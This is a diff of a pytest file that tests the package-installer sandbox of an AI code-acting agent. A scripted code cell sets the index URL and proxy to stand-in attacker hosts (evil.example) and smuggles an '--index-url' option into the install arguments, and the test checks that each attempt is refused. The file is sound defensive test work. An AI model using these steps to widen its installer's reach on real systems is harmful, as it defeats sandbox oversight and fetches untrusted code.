@@ -20,6 +20,7 @@ allow-list with the installer stubbed.
 
 from __future__ import annotations
 
+import asyncio
 import inspect
 import json
 import logging
@@ -36,7 +37,6 @@ from pathlib import Path
 
 import pytest
 
-from tests.helpers import _handle_project
 from tests.actor.code_act.core_world import (  # noqa: F401 (fixtures)
     core_world,
     new_actor,
@@ -796,23 +796,19 @@ def test_the_allow_list_is_the_index_and_the_operators_mirrors():
     ]
 
 
-def test_the_install_docs_say_what_installs():
-    """The install tools' descriptions match what the installer does: a
-    local wheel installs too, by an absolute path (the installer's working
-    directory is the environment, not the workspace, so a relative one would
-    not be found where the model put it)."""
-    from unify.actor import code_act_actor, core_surface
+def test_the_install_tool_says_what_installs():
+    """The install tool's description matches what the installer does: a local
+    wheel installs too, by an absolute path (the installer's working directory
+    is the environment, not the workspace, so a relative one would not be found
+    where the model put it)."""
+    from unify.common import tool_registry
 
-    for doc in (
-        core_surface._INSTALL_DOC,
-        code_act_actor._INSTALL_PYTHON_PACKAGES_DOC,
-    ):
-        flat = " ".join(doc.split())
-        assert (
-            "wheels only (from the package index, or an absolute path to a "
-            ".whl file in the workspace)"
-        ) in flat, flat
-        assert "./" not in doc and "published wheels" not in flat
+    flat = " ".join(tool_registry.registry()["install"].description.split())
+    assert (
+        "wheels only (from the package index, or an absolute path to a "
+        ".whl file in the workspace)"
+    ) in flat, flat
+    assert "./" not in flat and "published wheels" not in flat
 
 
 # ── inside the installer's sandbox ──────────────────────────────────────────
@@ -1082,7 +1078,7 @@ def test_real_uv_cannot_fetch_from_a_host_off_the_allow_list(world, monkeypatch)
     assert not outcome["success"], outcome
     assert "only CONNECT tunnels" in outcome["stderr"], outcome["stderr"]
     assert resolved == []
-    assert environment.missing(["probe"]) == ["probe"]
+    assert not list(environment.site_packages().glob("probe*"))
 
 
 # ── from a cell ─────────────────────────────────────────────────────────────
@@ -1094,18 +1090,20 @@ _WIDEN = textwrap.dedent(
     os.environ["UV_EXTRA_INDEX_URL"] = "https://evil2.example/simple"
     os.environ["HTTPS_PROXY"] = "http://evil.example:8080"
     os.environ["NO_PROXY"] = "*"
-    first = await install(["humanize"])
+    first = tools.install(["humanize"])
     try:
-        await install(["humanize"], index_url="https://evil.example/simple")
+        tools.install(["humanize"], index_url="https://evil.example/simple")
         widened = "accepted"
     except Exception as exc:
         widened = type(exc).__name__
     try:
-        await install(["--index-url=https://evil.example/simple", "humanize"])
+        tools.install(["--index-url=https://evil.example/simple", "humanize"])
         option = "accepted"
     except Exception as exc:
         option = type(exc).__name__
-    (first["success"], widened, option)
+    import json
+    first = first if isinstance(first, dict) else json.loads(first)
+    print("WIDEN", first["success"], widened, option)
     """,
 )
 
@@ -1113,13 +1111,9 @@ _WIDEN = textwrap.dedent(
 @needs_bwrap
 @pytest.mark.asyncio
 @pytest.mark.timeout(240)
-@_handle_project
 async def test_a_cell_cannot_widen_the_allow_list(core_world, monkeypatch):
-    from unify.actor import core_surface
-    from unify.actor.execution import _CURRENT_SANDBOX, PythonExecutionSession
-    from unify.actor.execution import worker
-
-    assert worker.enabled(), "cells must run in the sandboxed worker"
+    from tests.actor.code_act.test_in_code_tools_wiring import _tool_results, code
+    from tests.scripted_model import ScriptedModel, reply, scripted
 
     allowed: list[frozenset] = []
     launched: list[tuple[list[str], dict]] = []
@@ -1140,24 +1134,14 @@ async def test_a_cell_cannot_widen_the_allow_list(core_world, monkeypatch):
     monkeypatch.setattr(sandbox.EgressProxy, "__init__", watched)
     monkeypatch.setattr(environment, "subprocess", types.SimpleNamespace(run=fake_run))
 
-    actor = new_actor()
-    session = PythonExecutionSession(environments={})
-    objects = core_surface.sandbox_objects(actor, policy=core_surface.WritePolicy())
-    session.global_state.update(objects)
-    session.core_globals = objects
-    token = _CURRENT_SANDBOX.set(session)
-    try:
-        out = await actor.get_tools("act")["execute_code"].fn(
-            thought="Try to widen the installer's reach.",
-            code=_WIDEN,
-        )
-    finally:
-        _CURRENT_SANDBOX.reset(token)
-        await session.close()
-        await actor.close()
-    assert out.error is None, out.error
-    success, widened, option = out.result
-    assert success is True
+    model = ScriptedModel(actor=[reply(calls=[code(_WIDEN)]), reply("done")])
+    with scripted(model):
+        handle = await new_actor().act("Try to widen the installer's reach.", persist=False)
+        assert await asyncio.wait_for(handle.result(), 200) == "done"
+    shown = _tool_results(model.calls[1])
+    (line,) = [line for line in shown.splitlines() if line.startswith("WIDEN")]
+    _, success, widened, option = line.split()
+    assert success == "True", shown
     assert widened != "accepted" and option != "accepted", (widened, option)
     # One install ran, with the harness's allow-list and the harness's proxy.
     assert allowed == [frozenset(environment.DEFAULT_INDEX_HOSTS)]
